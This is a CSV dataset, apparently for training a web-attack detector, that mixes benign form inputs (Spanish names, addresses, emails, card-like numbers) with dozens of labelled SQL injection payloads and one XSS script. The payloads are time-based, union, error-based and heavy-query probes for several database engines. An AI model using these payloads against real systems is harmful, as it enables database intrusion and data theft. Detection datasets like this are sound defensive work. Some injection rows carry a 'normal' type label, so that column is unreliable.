Text,attack_type,Label,type
"1%')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
rosi10,norm,0,normal
"-5934' union all select 6096,6096,6096,6096,6096#",sqli,1,sql
unzaga gomariz,norm,0,normal
malleson_varney@tomorrow.com.cz,norm,0,normal
"c/ avi xaxu, 157,",norm,0,normal
san fernando de henares,norm,0,normal
cheres ochoa,norm,0,normal
praza da constitucion 162,norm,0,normal
"1%'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",sqli,1,sql
saturnina,norm,0,normal
695,norm,0,normal
niu,norm,0,normal
93310194e,norm,0,normal
sancarranco cantabella,norm,0,normal
exageracin,norm,0,normal
labossie2,norm,0,normal
"1%"")));select (case when (5464=9350) then 5464 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"1%"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"c/ juan carlos onetti 4, 1?d",norm,0,normal
tobar,norm,0,normal
valentini funosa,norm,0,normal
romeu herrero,norm,0,normal
elane,norm,0,normal
1%';select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
07650,norm,0,normal
nishio@granbretana.com.ml,norm,0,normal
1'));begin dbms_lock.sleep(5); end--,sqli,1,sql
5447434200049270,norm,0,normal
mirarchi,norm,0,normal
"1'||(select 'wtdz' from dual where 1866=1866 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
legrandv,norm,0,normal
ab6ga*d45co,norm,0,normal
55265136t,norm,0,normal
argos,norm,0,normal
valeika@italianmotorvillagesevilla.gd,norm,0,normal
"1%';iif(6369=5881,1,1/0)",sqli,1,sql
40,norm,0,normal
1'||(select 'fven' where 1433=1433 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))||',sqli,1,sql
putrefa8tiva,norm,0,normal
1))) rlike (select * from (select(sleep(5)))sgvo) and (((4574=4574,sqli,1,sql
mir,norm,0,normal
1902,norm,0,normal
42210,norm,0,normal
1)) or sleep(5) and ((8285=8285,sqli,1,normal
banqueta,norm,0,normal
bylina,norm,0,normal
reencar!nacin,norm,0,normal
besime,norm,0,normal
7752644300025700,norm,0,normal
1' and 6969=(select 6969 from pg_sleep(5)) and 'lqsa' like 'lqsa,sqli,1,sql
"1 where 3744=3744;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1');select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
nicomedes,norm,0,normal
fontanal callarisa,norm,0,normal
5115,norm,0,normal
boquieni,norm,0,normal
xanto,norm,0,normal
8arrascal485,norm,0,normal
25613,norm,0,normal
caterina,norm,0,normal
darcy@google-movil.dz,norm,0,normal
ansorger,norm,0,normal
15423399j,norm,0,normal
1') as lewd where 3118=3118 order by 1--,sqli,1,sql
querando,norm,0,normal
09899393d,norm,0,normal
regas@zonamodelos.tk,norm,0,normal
teruyuki,norm,0,normal
1'+(select brgo where 9100=9100 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
rutledge,norm,0,normal
6425495308772628,norm,0,normal
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",sqli,1,sql
10898485g,norm,0,normal
katcher,norm,0,normal
44122,norm,0,normal
"1'+(select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1,sql
zorita del maestrazgo,norm,0,normal
henckels@easyviaggio.tr,norm,0,normal
"1)) as huxq where 7451=7451 union all select null,null,null--",sqli,1,sql
"1' where 2661=2661;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
kaufherr.gargoet@santacruzdelvoto.sh,norm,0,normal
33279,norm,0,normal
1'||(select 'mobv' from dual where 6338=6338;select sleep(5))||',sqli,1,sql
papadouka_cuttinet@professionalhosting.com.il,norm,0,normal
-1280')) or 8571=8571--,sqli,1,sql
"1%""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",sqli,1,sql
anand,norm,0,normal
17121,norm,0,normal
eial,norm,0,normal
"1%"" union all select null,null,null,null,null#",sqli,1,sql
"dos aceras 119,",norm,0,normal
2821707836126747,norm,0,normal
baigent@blueberryminiloaf.com.dj,norm,0,normal
3409473973742176,norm,0,normal
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('beju' like 'beju",sqli,1,sql
"1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (9509=9509",sqli,1,sql
-1603')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('abmo'='abmo,sqli,1,sql
aida,norm,0,normal
"1))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((9401=9401",sqli,1,sql
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""mmvu""=""mmvu",sqli,1,sql
keer,norm,0,normal
cauifield@tuviaje.com.af,norm,0,normal
"1"") where 3943=3943 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
travs elias,norm,0,normal
34105397p,norm,0,normal
"calle alonso nuez 186, 12?b",norm,0,normal
"1"") union all select null,null#",sqli,1,sql
5937893714425522,norm,0,normal
03621656f,norm,0,normal
molvzar,norm,0,normal
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('xdfz'='xdfz",sqli,1,normal
9959095212447652,norm,0,normal
1'||(select 'tvcy' where 5592=5592 order by 1#,sqli,1,sql
dobbing3,norm,0,normal
palls de buran,norm,0,normal
1')) as fqia where 1936=1936 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
roco@forohh.ge,norm,0,normal
tape,norm,0,normal
o.leary,norm,0,normal
4920792852511855,norm,0,normal
procltico,norm,0,normal
"calle valencia de don juan 161, 7?d",norm,0,normal
"1) where 6090=6090;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"""><script>alert('xssya')</script>",xss,2,xss
jarvie,norm,0,normal
7576,norm,0,normal
"1'+(select dgnt where 4701=4701 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
carrer rusc 29,norm,0,normal
enchufe,norm,0,normal
nel,norm,0,normal
9738066615220073,norm,0,normal
4501987508782909,norm,0,normal
4or3554e0a,norm,0,normal
"plza. leire, 1, 6?a",norm,0,normal
ninnette,norm,0,normal
nordes!tal,norm,0,normal
51285362p,norm,0,normal
7115660202719431,norm,0,normal
3549,norm,0,normal
gamonosa,norm,0,normal
"entrada el zurdo, 166 7?e",norm,0,normal
varia,norm,0,normal
1')) as hzbj where 1725=1725 or sleep(5)#,sqli,1,normal
repisa,norm,0,normal
guntar,norm,0,normal
7erg47,norm,0,normal
nuri,norm,0,normal
"-9197%""))) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",sqli,1,sql
-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902,sqli,1,sql
1') where 4867=4867 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
fina,norm,0,normal
71997567t,norm,0,normal
5619033221013076,norm,0,normal
"1)) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
1'||(select 'ldad' where 6146=6146 rlike (select (case when (7689=7689) then 1 else 0x28 end)))||',sqli,1,sql
27654,norm,0,normal
qwerty,norm,0,normal
33160,norm,0,normal
1'));select sleep(5) and (('ilcv'='ilcv,sqli,1,sql
-5854))) union all select 5645#,sqli,1,sql
1) as iknl where 3885=3885 rlike sleep(5)#,sqli,1,normal
kosmalska_gayou@inversioneolica.mv,norm,0,normal
5695,norm,0,normal
gejar sierra,norm,0,normal
1')) and 4595=4595#,sqli,1,normal
lanae,norm,0,normal
39719,norm,0,normal
5292453383315406,norm,0,normal
uvalle urpina,norm,0,normal
stroeby@jesusfelipe.lv,norm,0,normal
jndula couttolenc,norm,0,normal
vladimirov@saludyfitness.br,norm,0,normal
19227,norm,0,normal
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",sqli,1,sql
esc2n3alosa5e4te,norm,0,normal
pojmaevich tissera,norm,0,normal
"pego, el",norm,0,normal
booth,norm,0,normal
ikediek torrades,norm,0,normal
kruse,norm,0,normal
cerda de vigo,norm,0,normal
marino luis carrillo 50 7?d,norm,0,normal
mckenney,norm,0,normal
"pedrosas, las",norm,0,normal
"1' where 1602=1602 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
altaira,norm,0,normal
"1))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((7484=7484",sqli,1,normal
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,sql
.me5c4illa,norm,0,normal
chutas,norm,0,normal
"1'))) and elt(3114=3114,sleep(5))#",sqli,1,normal
maijhara,norm,0,normal
70190724z,norm,0,normal
"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
sandi,norm,0,normal
delle,norm,0,normal
nue37,norm,0,normal
viola5,norm,0,normal
39694,norm,0,normal
00033926r,norm,0,normal
1'||(select 'zwcp' where 3333=3333;select (case when (7163=1777) then 1 else 7163*(select 7163 from master..sysdatabases) end)--,sqli,1,sql
3497,norm,0,normal
03331390r,norm,0,normal
"1%"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""%""=""",sqli,1,normal
antonelli-ankrum@escarba.pm,norm,0,normal
"1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
cowper,norm,0,normal
1';waitfor delay '0:0:5'--,sqli,1,sql
16312,norm,0,normal
18128,norm,0,normal
hanlon@importaproductosespaoles.cs,norm,0,normal
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('ajka'='ajka,sqli,1,sql
frankeur@tardos.pro,norm,0,normal
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",sqli,1,sql
"1' and make_set(8403=8403,8899)",sqli,1,normal
heicy,norm,0,normal
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
calle minerva 66 12?c,norm,0,normal
lezama,norm,0,normal
"1') where 6489=6489 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
cambiazo,norm,0,normal
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)-- mwsm",sqli,1,sql
fiallos,norm,0,normal
larenas derch,norm,0,normal
barrs obrador,norm,0,normal
sturt@biosoftware.id,norm,0,normal
lizana rom,norm,0,normal
arre,norm,0,normal
"1%"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""",sqli,1,sql
"1"") as hhxx where 3372=3372 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
9369957751298243,norm,0,normal
"-7637"" union all select 8498,8498,8498--",sqli,1,sql
"-5706"")) union all select 2013,2013,2013,2013#",sqli,1,sql
22584,norm,0,normal
frailes,norm,0,normal
"-6948"")) as ojjl where 1300=1300 or 6872=6872--",sqli,1,sql
1) where 5774=5774;select case when 9848=2618 then 1 else null end--,sqli,1,sql
planes fonterosa,norm,0,normal
31827013g,norm,0,normal
54372602g,norm,0,normal
fanning_shepherd@bruoseguridad.name,norm,0,normal
3407,norm,0,normal
dailey@flabingo.gw,norm,0,normal
croiseti,norm,0,normal
7208320116493837,norm,0,normal
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('nvsy' like 'nvsy",sqli,1,sql
"manuel monterrey calvo, 186,",norm,0,normal
"1"" and 4996=4431 and ""jzaq""=""jzaq",sqli,1,normal
"plza. musico diaz cano 5,",norm,0,normal
50366,norm,0,normal
-3982)) or 6872=6872 and ((6331=6331,sqli,1,normal
oasi0s,norm,0,normal
7611183184008981,norm,0,normal
1')) as joco where 2922=2922;select sleep(5)--,sqli,1,sql
giuliani casabella,norm,0,normal
19310,norm,0,normal
lubienska@suardistec.ai,norm,0,normal
"calle moreria 190, 10?a",norm,0,normal
"1'+(select 'swxi' where 7651=7651 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",sqli,1,sql
5812483495422600,norm,0,normal
7387,norm,0,normal
davel,norm,0,normal
1013839255415195,norm,0,normal
monrrabal,norm,0,normal
brandsen,norm,0,normal
3096,norm,0,normal
contrapalanqun,norm,0,normal
5494259806699868,norm,0,normal
7983167962218545,norm,0,normal
caabate liano,norm,0,normal
04878,norm,0,normal
t6t2lado,norm,0,normal
1) as fnpq where 5209=5209;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
1034309024332493,norm,0,normal
zarpanel,norm,0,normal
whipple,norm,0,normal
"1' and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
1%') or 6793=(select 6793 from pg_sleep(5)) and ('%'=',sqli,1,sql
b3st2z4,norm,0,normal
"pl. don fernando, s/n,",norm,0,normal
74132716j,norm,0,normal
"luis braille, 33, 12?d",norm,0,normal
12113019t,norm,0,normal
